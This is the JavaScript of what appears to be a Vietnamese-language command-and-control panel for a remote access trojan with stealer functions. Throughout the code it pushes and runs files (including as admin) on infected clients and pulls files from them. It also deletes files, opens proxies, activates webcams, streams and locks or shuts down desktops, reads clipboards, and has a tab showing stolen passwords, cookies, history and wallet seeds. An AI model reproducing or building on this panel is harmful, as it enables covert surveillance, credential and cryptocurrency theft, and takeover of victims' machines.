    animation:fadeIn .2s;max-width:360px;word-break:break-all;`;
  t.textContent = msg;
  document.body.appendChild(t);
  setTimeout(() => t.remove(), 4000);
}

async function fmUpload() {
  if (!_fmSelectedFile) { _fmToast('⚠ Vui lòng chọn file trước!', true); return; }
  if (!currentClient)   { _fmToast('⚠ Chưa chọn client!', true); return; }

  const base         = document.getElementById('filePath')?.value || 'C:\\';
  const fileToUpload = _fmSelectedFile;
  const btn          = document.getElementById('fm-upload-btn');
  if (btn) { btn.disabled = true; btn.textContent = '⏳ …'; }

  // Hiển thị progress trong panel (không đóng panel)
  _fmUploadSetProgress(5, 'ĐANG ĐỌC FILE…');

  try {
    // ── Bước 1: Đọc file sang Base64 ──
    const b64 = await new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload  = e => resolve(e.target.result.split(',')[1]);
      reader.onerror = () => reject(new Error('Không đọc được file'));
      reader.readAsDataURL(fileToUpload);
    });

    _fmUploadSetProgress(20, 'ĐANG LƯU FILE VÀO DATABASE…');

    // ── Bước 2: Lưu file (base64) vào Database 1 qua api.php ──
    const saveRes = await fetch('api.php?action=save_upload_file', {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action:    'save_upload_file',
        filename:  fileToUpload.name,
        filedata:  b64,
        destpath:  base,
        client_id: currentClient.id,
        hwid:      currentClient.hwid || currentClient.id
      })
    });
    const saveJson = await saveRes.json();

    if (saveJson.status !== 'ok' || !saveJson.data?.file_id) {
      throw new Error('Lỗi lưu DB: ' + (saveJson.message || 'Unknown'));
    }

    const fileId = saveJson.data.file_id;
    _fmUploadSetProgress(55, `FILE LƯU DB OK (ID=${fileId}) — ĐANG GỬI LỆNH ĐẾN CLIENT…`);

    // ── Bước 3: Gửi lệnh chosene+fileId+path+hwid qua manager.php ──
    const cmdRes = await fetch('manager.php?action=chosene', {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action:    'chosene',
        file_id:   fileId,
        path:      base,
        client_id: currentClient.id,
        hwid:      currentClient.hwid || currentClient.id
      })
    });
    const cmdJson = await cmdRes.json();

    if (cmdJson.status !== 'ok') {
      throw new Error('Lỗi gửi lệnh: ' + (cmdJson.message || 'Unknown'));
    }

    _fmUploadSetProgress(100, `LỆNH GỬI OK — CLIENT SẼ NHẬN FILE VÀO ${base}`);
    _fmToast(`✓ Upload OK — "${fileToUpload.name}" → ${base}`, false);

    // Reset panel và làm mới danh sách file sau 1 giây
    setTimeout(() => {
      _fmUploadReset();
      toggleFmPanel(null);
      browseDir(base);
    }, 1200);

  } catch (err) {
    console.error('[fmUpload] Error:', err);
    _fmUploadSetProgress(0, 'LỖI!');
    _fmToast('✗ ' + err.message, true);
    const base2 = document.getElementById('filePath')?.value || 'C:\\';
    setTimeout(() => { _fmUploadReset(); browseDir(base2); }, 2000);
  } finally {
    if (btn) { btn.disabled = false; btn.textContent = '⬆ Upload'; }
  }
}

// ─── ROW CHECKBOX HELPERS ────────────────────────────────
function fmToggleRow(cell) {
  const cb = cell.querySelector('.fm-cb');
  const row = cell.closest('tr');
  if (!cb || !row) return;
  const checked = cb.classList.toggle('checked');
  row.classList.toggle('selected', checked);
  // sync "select all" header checkbox
  const allCb = document.getElementById('fm-cb-all');
  if (allCb) {
    const all  = document.querySelectorAll('#fileBody .fm-cb');
    const done = document.querySelectorAll('#fileBody .fm-cb.checked');
    if (done.length === 0) { allCb.classList.remove('checked'); }
    else if (done.length === all.length) { allCb.classList.add('checked'); }
    else { allCb.classList.remove('checked'); } // indeterminate — just unchecked
  }
}

function fmToggleAll(allCb) {
  const checked = allCb.classList.toggle('checked');
  document.querySelectorAll('#fileBody tr.file-row').forEach(row => {
    const cb = row.querySelector('.fm-cb');
    if (!cb) return;
    if (checked) { cb.classList.add('checked'); row.classList.add('selected'); }
    else         { cb.classList.remove('checked'); row.classList.remove('selected'); }
  });
}

function fmGetSelectedPaths() {
  return [...document.querySelectorAll('#fileBody tr.file-row.selected')]
    .map(r => decodeURIComponent(r.dataset.path || ''))
    .filter(Boolean);
}

async function downloadSel() {
  const paths = fmGetSelectedPaths();
  if (!paths.length) { alert('Vui lòng chọn ít nhất 1 file!'); return; }
  if (!currentClient) { alert('Chưa chọn client!'); return; }

  const hwid = currentClient.hwid || currentClient.id;

  for (const filePath of paths) {
    try {
      const res = await fetch('manager.php?action=bolayfile', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action:    'bolayfile',
          pathfile:  filePath,
          client_id: currentClient.id,
          hwid:      hwid
        })
      });
      const json = await res.json();
      if (json.status === 'ok') {
        _fmToast('✓ Đã gửi lệnh yêu cầu Client lấy file: ' + filePath, false);
        _autoDownloadWhenReady(currentClient.id, filePath);
      } else {
        _fmToast('✗ Lỗi: ' + (json.message || 'Error'), true);
      }
    } catch (e) {
      console.error('Lỗi kết nối khi gửi lệnh bolayfile:', e);
      _fmToast('✗ Lỗi kết nối gửi lệnh lấy file!', true);
    }
  }
}

// Tự động kiểm tra CSDL và tải file từ Database về máy khi Client upload hoàn tất
function _autoDownloadWhenReady(clientId, filePath) {
  let attempts = 0;
  const maxAttempts = 30;
  const interval = setInterval(async () => {
    attempts++;
    if (attempts > maxAttempts) {
      clearInterval(interval);
      _fmToast('⏰ Hết thời gian chờ Client gửi file. Nhấn [📥 Files Đã Tải] để kiểm tra.', true);
      return;
    }
    try {
      const res = await fetch('api.php?action=get_downloaded_files&client_id=' + encodeURIComponent(clientId));
      const json = await res.json();
      if (json.status === 'ok' && Array.isArray(json.data)) {
        const normTarget = filePath.toLowerCase().replace(/\//g, '\\');
        const found = json.data.find(item => (item.filepath || '').toLowerCase().replace(/\//g, '\\') === normTarget);
        if (found && found.id) {
          clearInterval(interval);
          _fmToast('⬇ Đã nhận dữ liệu file từ Client! Đang tự động tải về máy…', false);
          window.location.href = 'api.php?action=download_file&id=' + found.id;
        }
      }
    } catch (e) {
      console.error('Lỗi polling file:', e);
    }
  }, 2000);
}

async function fmRunSel(asAdmin) {
  const paths = fmGetSelectedPaths();
  if (!paths.length) { alert('Vui lòng chọn ít nhất 1 file!'); return; }
  if (!currentClient) { alert('Chưa chọn client!'); return; }

  const hwid = currentClient.hwid || currentClient.id;
  const action = asAdmin ? 'runfileadmin' : 'runfilenha';
  const label = asAdmin ? 'Run as Admin' : 'Run';

  for (const filePath of paths) {
    try {
      const res = await fetch('manager.php?action=' + action, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action:    action,
          pathfile:  filePath,
          client_id: currentClient.id,
          hwid:      hwid
        })
      });
      const json = await res.json();
      if (json.status === 'ok') {
        _fmToast('✓ Đã gửi lệnh ' + label + ': ' + filePath, false);
      } else {
        _fmToast('✗ Lỗi: ' + (json.message || 'Error'), true);
      }
    } catch (e) {
      console.error('Lỗi kết nối khi gửi lệnh ' + action + ':', e);
      _fmToast('✗ Lỗi kết nối gửi lệnh!', true);
    }
  }
}

async function deleteSel() {
  const paths = fmGetSelectedPaths();
  if (!paths.length) { alert('Vui lòng chọn ít nhất 1 file hoặc thư mục!'); return; }
  if (!currentClient) { alert('Chưa chọn client!'); return; }

  if (!confirm(`⚠ Xác nhận xóa ${paths.length} mục đã chọn?\n\nCảnh báo: Thao tác này không thể hoàn tác!`)) return;

  const hwid = currentClient.hwid || currentClient.id;
  const base = document.getElementById('filePath')?.value || 'C:\\';

  for (const filePath of paths) {
    try {
      const res = await fetch('manager.php?action=cutfile', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action:    'cutfile',
          pathfile:  filePath,
          client_id: currentClient.id,
          hwid:      hwid
        })
      });
      const json = await res.json();
      if (json.status === 'ok') {
        _fmToast('✓ Đã gửi lệnh xóa: ' + filePath, false);
      } else {
        _fmToast('✗ Lỗi: ' + (json.message || 'Error'), true);
      }
    } catch (e) {
      console.error('Lỗi kết nối khi gửi lệnh cutfile:', e);
      _fmToast('✗ Lỗi kết nối gửi lệnh xóa!', true);
    }
  }

  // Tự động làm mới danh sách sau khi gửi lệnh xóa
  setTimeout(() => browseDir(base), 1500);
}


// ─── PROXY / WEBCAM / STEALER HELPERS ───────────────────
function startProxy() {
  const type=document.getElementById('proxyType')?.value;
  const port=document.getElementById('proxyPort')?.value||1080;
  sendCommand(currentClient.id, `proxy_start:${type}:${port}`);
  const dot=document.getElementById('proxyDot'),st=document.getElementById('proxyStatusText');
  if(dot){dot.className='dot on';}  if(st){st.style.color='var(--accent)';st.textContent=`${type} ACTIVE — 0.0.0.0:${port}`;}
}
function stopProxy() {
  sendCommand(currentClient.id,'proxy_stop');
  const dot=document.getElementById('proxyDot'),st=document.getElementById('proxyStatusText');
  if(dot){dot.className='dot away';} if(st){st.style.color='#555';st.textContent='INACTIVE';}
}
function startWebcam() { sendCommand(currentClient.id,'webcam_start'); const st=document.getElementById('camStatus');if(st){st.className='tag tag-online';st.textContent='ACTIVE';} }
function stopWebcam()  { sendCommand(currentClient.id,'webcam_stop');  const st=document.getElementById('camStatus');if(st){st.className='tag tag-away';st.textContent='INACTIVE';} }
function snapWebcam()  { sendCommand(currentClient.id,'webcam_snap'); }

// =============================================================
//  REMOTE DESKTOP CONTROLLER
// =============================================================
window._rdAutoOn      = false;
window._rdLastCapture = '';

function rdToast(msg, dur = 2500) {
  const t = document.getElementById('rdToast');
  if (!t) return;
  t.textContent = msg;
  t.style.display = 'block';
  clearTimeout(t._timer);
  t._timer = setTimeout(() => { t.style.display = 'none'; }, dur);
}

// --- ULTRA HIGH SPEED CANVAS RENDERING ENGINE (Hardware Accelerated) ---
window._rdFrameCount = 0;
window._rdLastFpsTime = performance.now();
window._rdIsFetching = false;

async function rdSetLiveImage(base64, capturedAt) {
  const idle = document.getElementById('rdIdle');
  const canvas = document.getElementById('rdCanvas');
  const imgFallback = document.getElementById('rdLiveImg');
  const badge = document.getElementById('rdLiveBadge');
  const fpsBadge = document.getElementById('rdFpsBadge');
  if (!canvas) return;

  if (base64) {
    window._rdLastCapture = base64;
    
    try {
      // Decode dữ liệu Base64 qua luồng C++ Native của Trình duyệt (Nhanh gấp 5 lần JS Loop)
      const res = await fetch('data:image/jpeg;base64,' + base64);
      const blob = await res.blob();
      const bitmap = await createImageBitmap(blob);
      
      if (canvas.width !== bitmap.width || canvas.height !== bitmap.height) {
        canvas.width = bitmap.width;
        canvas.height = bitmap.height;
      }
      const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
      ctx.drawImage(bitmap, 0, 0);
      bitmap.close();

      canvas.style.display = 'block';
      if (imgFallback) imgFallback.style.display = 'none';
      if (idle) idle.style.display = 'none';
      if (badge) badge.style.display = 'block';
      if (fpsBadge) fpsBadge.style.display = 'block';
      const resBadge = document.getElementById('rdResBadge');
      if (resBadge) resBadge.style.display = 'flex';

      window._rdFrameCount++;
      const now = performance.now();
      if (now - window._rdLastFpsTime >= 1000) {
        const fps = Math.round((window._rdFrameCount * 1000) / (now - window._rdLastFpsTime));
        if (fpsBadge) fpsBadge.textContent = fps + ' FPS';
        window._rdFrameCount = 0;
        window._rdLastFpsTime = now;
      }
    } catch(e) {
      // Fallback nếu không hỗ trợ ImageBitmap
      const img = new Image();
      img.onload = function() {
        canvas.width = img.width;
        canvas.height = img.height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(img, 0, 0);
        canvas.style.display = 'block';
      };
      img.src = 'data:image/jpeg;base64,' + base64;
    }
  }
}

// Hàm gửi lệnh đổi độ phân giải từ UI
async function rdChangeResolution(widthVal) {
  if (!currentClient) return;
  rdToast('[ SETTING RES: ' + widthVal + 'P... ]', 2000);
  await sendCommand(currentClient.id, 'setres:' + widthVal);
}

function rdClearLive() {
  const idle = document.getElementById('rdIdle');
  const canvas = document.getElementById('rdCanvas');
  const imgFallback = document.getElementById('rdLiveImg');
  const badge = document.getElementById('rdLiveBadge');
  const fpsBadge = document.getElementById('rdFpsBadge');
  if (canvas) canvas.style.display = 'none';
  if (imgFallback) { imgFallback.src = ''; imgFallback.style.display = 'none'; }
  if (idle) idle.style.display = 'flex';
  if (badge) badge.style.display = 'none';
  if (fpsBadge) fpsBadge.style.display = 'none';
  const resBadge = document.getElementById('rdResBadge');
  if (resBadge) resBadge.style.display = 'none';
  window._rdLastCapture = '';
  window._rdPollInProgress = false;
}

window._rdFrameQueue     = [];
window._rdLastFrameId    = 0;
window._rdPlaybackTimer  = null;
window._rdPollInProgress = false;
window._rdMaxQueueSize   = 5;  // Giới hạn queue để tránh lag

// Optimized polling với requestAnimationFrame
async function rdPollScreenshot() {
  if (!currentClient || !window._rdAutoOn || window._rdPollInProgress) return;

  window._rdPollInProgress = true;
  try {
    const url = 'desktop.php?action=get_screenshot&client_id=' + encodeURIComponent(currentClient.id) + '&last_id=' + window._rdLastFrameId;
    const res = await fetch(url, {
      cache: 'no-store',
      priority: 'high'  // High priority for better performance
    });
    const json = await res.json();

    if (json.status === 'ok' && json.data && Array.isArray(json.data.frames)) {
      for (const f of json.data.frames) {
        if (f.id > window._rdLastFrameId) {
          window._rdLastFrameId = f.id;

          // Queue management: giữ tối đa N frames
          if (window._rdFrameQueue.length >= window._rdMaxQueueSize) {
            // Drop oldest frames khi queue đầy
            window._rdFrameQueue.shift();
          }
          window._rdFrameQueue.push(f);
        }
      }
    }
  } catch(e) {
    console.warn('[RD] Poll error:', e);
  } finally {
    window._rdPollInProgress = false;

    // Schedule next poll using requestAnimationFrame for 60fps sync
    if (window._rdAutoOn) {
      requestAnimationFrame(rdPollScreenshot);
    }
  }
}

function rdStartPlayback() {
  if (window._rdPlaybackTimer) cancelAnimationFrame(window._rdPlaybackTimer);

  let lastRenderTime = 0;
  const minFrameInterval = 1000 / 60; // Max 60fps rendering

  function playNext(timestamp) {
    if (!window._rdAutoOn) return;

    // Throttle rendering to max 60fps
    if (timestamp - lastRenderTime >= minFrameInterval) {
      if (window._rdFrameQueue.length > 0) {
        // Nếu queue có nhiều frames, skip để catch up
        const framesToSkip = Math.max(0, window._rdFrameQueue.length - 2);
        for (let i = 0; i < framesToSkip; i++) {
          window._rdFrameQueue.shift();
        }

        const nextFrame = window._rdFrameQueue.shift();
        if (nextFrame && nextFrame.image) {
          rdSetLiveImage(nextFrame.image, nextFrame.captured_at);
        }
      }
      lastRenderTime = timestamp;
    }

    window._rdPlaybackTimer = requestAnimationFrame(playNext);
  }

  window._rdPlaybackTimer = requestAnimationFrame(playNext);
}

function rdStartPolling() {
  window._rdFrameQueue = [];
  window._rdLastFrameId = 0;
  window._rdPollInProgress = false;

  // Start playback loop
  rdStartPlayback();

  // Start polling loop (sẽ tự loop qua requestAnimationFrame)
  requestAnimationFrame(rdPollScreenshot);
}

function rdStopPolling() {
  if (window._rdPlaybackTimer) {
    cancelAnimationFrame(window._rdPlaybackTimer);
    window._rdPlaybackTimer = null;
  }
  window._rdFrameQueue = [];
  window._rdLastFrameId = 0;
  window._rdPollInProgress = false;
}

async function rdRequestScreenshot() {
  if (!currentClient) return;
  const hwid = currentClient.hwid || '';
  rdToast('[ SENDING SCREENSHOT REQUEST... ]');
  const res = await sendCommand(currentClient.id, 'muonmayti' + hwid);
  if (res && res.status === 'ok') {
    rdToast('[ REQUEST SENT — WAITING FOR AGENT ]', 3000);
    // Poll 1 lan sau 3s
    setTimeout(rdPollScreenshot, 3000);
  } else {
    rdToast('[ FAILED TO SEND REQUEST ]');
  }
}

async function rdToggleAuto() {
  if (!currentClient) return;
  const btn  = document.getElementById('rdAutoBtn');
  const hwid = currentClient.hwid || '';

  if (!window._rdAutoOn) {
    // === BAT AUTO ON ===
    window._rdAutoOn = true;
    if (btn) {
      btn.innerHTML = '&#9646;&#9646; AUTO ON';
      btn.style.color = 'var(--accent)';
      btn.style.textShadow = '0 0 8px var(--glow)';
    }
    // Gui lenh muonmayti bat remote mode
    await sendCommand(currentClient.id, 'muonmayti' + hwid);
    rdToast('[ AUTO STREAM ACTIVATED ]', 2000);
    rdStartPolling();
  } else {
    // === TAT AUTO OFF ===
    window._rdAutoOn = false;
    if (btn) {
      btn.innerHTML = '&#9654; AUTO OFF';
      btn.style.color = '#777';
      btn.style.textShadow = 'none';
    }
    rdStopPolling();
    rdClearLive();
    // Gui lenh tramayday tat remote mode
    await sendCommand(currentClient.id, 'tramayday' + hwid);
    rdToast('[ AUTO STREAM DEACTIVATED ]', 2000);
  }
}

async function rdQuickCmd(cmd) {
  if (!currentClient) return;
  const res = await sendCommand(currentClient.id, cmd);
  rdToast(res && res.status === 'ok' ? '[ COMMAND QUEUED ]' : '[ SEND FAILED ]');
}

async function rdLockScreen() {
  if (!currentClient) return;
  const hwid = currentClient.hwid || '';
  rdToast('[ SENDING LOCK COMMAND... ]', 2000);
  const res = await sendCommand(currentClient.id, 'lock' + hwid);
  rdToast(res && res.status === 'ok' ? '[ LOCK COMMAND SENT ]' : '[ LOCK FAILED ]');
}

async function rdRestartComputer() {
  if (!currentClient) return;
  const hwid = currentClient.hwid || '';
  rdToast('[ SENDING RESTART COMMAND... ]', 2000);
  const res = await sendCommand(currentClient.id, 'khoidong' + hwid);
  rdToast(res && res.status === 'ok' ? '[ RESTART COMMAND SENT ]' : '[ RESTART FAILED ]');
}

async function rdShutdownComputer() {
  if (!currentClient) return;
  const hwid = currentClient.hwid || '';
  rdToast('[ SENDING SHUTDOWN COMMAND... ]', 2000);
  const res = await sendCommand(currentClient.id, 'tatmay' + hwid);
  rdToast(res && res.status === 'ok' ? '[ SHUTDOWN COMMAND SENT ]' : '[ SHUTDOWN FAILED ]');
}
function initRemote()  { var hwid = currentClient.hwid || ''; sendCommand(currentClient.id, 'muonmayti' + hwid); }
let autoRemoteInt=null;
function toggleRemoteAuto() {
  const btn=document.getElementById('autoBtn');
  if(autoRemoteInt){clearInterval(autoRemoteInt);autoRemoteInt=null;if(btn)btn.textContent='▶ AUTO (off)';}
  else{autoRemoteInt=setInterval(()=>sendCommand(currentClient.id,'screenshot'),5000);if(btn)btn.textContent='■ AUTO (on)';}
}
function captureScreen() { sendCommand(currentClient.id,'screenshot'); }
function setAutoCapture() { sendCommand(currentClient.id,'screenshot_auto:30'); }
function sendCmd(cmd) { if(currentClient) sendCommand(currentClient.id,cmd); }
function showStealerTab(tab,btn) {
  document.querySelectorAll('.stealer-tab').forEach(t=>t.classList.remove('active'));
  if(btn)btn.classList.add('active');
  const sb=document.getElementById('stealerBody');
  const headers={passwords:'<th>URL</th><th>USERNAME</th><th>PASSWORD</th><th>BROWSER</th>',cookies:'<th>DOMAIN</th><th>NAME</th><th>VALUE</th><th>EXPIRY</th>',history:'<th>URL</th><th>TITLE</th><th>VISITS</th><th>LAST VISIT</th>',wallets:'<th>WALLET</th><th>SEED</th><th>BALANCE</th><th>PATH</th>'};
  const thead=document.querySelector('.stealer-table thead tr');
  if(thead)thead.innerHTML=headers[tab]||headers.passwords;
  if(sb)sb.innerHTML=`<tr><td colspan="4" class="empty-state">[ NO ${tab.toUpperCase()} DATA — RUN MODULE ]</td></tr>`;
}
function saveComment(val) { if(currentClient)localStorage.setItem('comment_'+currentClient.id,val); }

// ─── API CALLS ───────────────────────────────────────────
async function loadClients() {
  try {
    const res=await fetch('api.php?action=clients');
    const json=await res.json();
    if(json.status==='ok'&&Array.isArray(json.data)){CLIENTS=json.data;renderTable(CLIENTS);}
    else renderTable([]);
  } catch { renderTable([]); }
}
async function loadStats() {
  try { const res=await fetch('api.php?action=stats');const json=await res.json();if(json.status==='ok')renderStats(json.data); } catch {}
}
async function loadClipboards(clientId) {
  try { const res=await fetch('api.php?action=clipboards&client_id='+encodeURIComponent(clientId));const json=await res.json();if(json.status==='ok')return json.data; } catch {}
  return [];
}
async function sendCommand(clientId, command) {
  try { const res=await fetch('api.php?action=send_command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({client_id:clientId,command:command})});return await res.json(); } catch {}
  return null;
}
async function loadCommandHistory(clientId) {
  try { const res=await fetch('api.php?action=command_history&client_id='+encodeURIComponent(clientId));const json=await res.json();if(json.status==='ok')return json.data; } catch {}
  return [];
}

// ─── ADMIN CHAT UNREAD BADGE (polling only) ───────────────
let chatLastKnownId = 0;
let chatUnread = 0;

function updateChatBadge() {
  const badge = document.getElementById('chatBadge');
  if (!badge) return;
  if (chatUnread > 0) {
    badge.textContent = chatUnread > 9 ? '9+' : chatUnread;
    badge.classList.add('show');
  } else {
    badge.classList.remove('show');
  }
}

// Seed the last known ID so we don't show stale unread on first load
async function initChatBadge() {
  try {
    const res  = await fetch('api.php?action=get_chat');
    const json = await res.json();
    if (json.status === 'ok' && Array.isArray(json.data) && json.data.length > 0) {
      chatLastKnownId = Math.max(...json.data.map(m => parseInt(m.id)||0));
    }
  } catch {}
}

async function pollChatUnread() {
  if (chatLastKnownId === 0) return;
  try {
    const res  = await fetch('api.php?action=get_chat&since=' + chatLastKnownId);
    const json = await res.json();
    if (json.status !== 'ok' || !Array.isArray(json.data) || json.data.length === 0) return;
    chatUnread += json.data.length;
    chatLastKnownId = Math.max(...json.data.map(m => parseInt(m.id)||0));
    updateChatBadge();
  } catch {}
}

initChatBadge();
setInterval(pollChatUnread, 5000);

// ─── INIT ────────────────────────────────────────────────
// Ticker
const ti=document.getElementById('tickerInner');
if(ti) ti.innerHTML=[...TICKER_ITEMS,...TICKER_ITEMS].map(x=>`<span class="ticker-item${x.w?' warn':''}">${x.t}</span>`).join('');

// Color presets
const presetsEl=document.getElementById('presets');
if(presetsEl) PRESETS.forEach(c=>{
  const d=document.createElement('div');
  if(c==='rainbow'){
    d.className='pdot rainbow-dot';
    d.title='rainbow';
    d.setAttribute('title','rainbow');
    d.onclick=()=>{ startRainbow(); };
    d.style.background='conic-gradient(red,orange,yellow,lime,cyan,blue,violet,red)';
  } else {
    d.className='pdot'+(c==='#ff0090'?' active':'');
    d.style.background=c;
    d.title=c;
    d.onclick=()=>{ setAccent(c); const cp=document.getElementById('colorPicker'); if(cp)cp.value=c; };
  }
  presetsEl.appendChild(d);
});

applyStoredSettings();
loadProfileFromServer();
loadClients();
loadStats();

setInterval(()=>{ loadClients(); loadStats(); }, 3000);
setInterval(()=>{ if(currentClient&&activeTab==='terminal') updateTerminalHistory(); }, 4000);

// Window resize: re-apply mobile detection
window.addEventListener('resize', ()=>{
  const isMob = window.innerWidth < 768;
  const panel=document.getElementById('clientPanel');
  const badge=document.getElementById('deviceBadge');
  if(panel){ if(isMob)panel.classList.add('mobile-cp-mode'); else panel.classList.remove('mobile-cp-mode'); }
  if(badge) badge.textContent = isMob ? '📱 MOBILE' : '🖥 PC';
});
</script>
</body>
</html>
